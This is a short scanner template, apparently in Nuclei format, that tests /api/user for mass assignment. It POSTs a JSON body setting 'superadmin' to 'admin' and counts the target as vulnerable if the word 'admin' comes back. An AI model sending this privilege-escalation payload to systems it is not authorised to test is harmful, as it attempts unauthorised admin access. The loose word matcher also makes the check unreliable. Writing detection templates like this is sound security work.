id: mass3-010
name: 'Mass field superadmin'
severity: high
type: active
tags:
  - mass-assignment
  - auth
  - api
description: 'Unfiltered superadmin on /api/user'
requests:
  - method: POST
    path: '{{BaseURL}}/api/user'
    body: '{"name":"t","superadmin":"admin"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
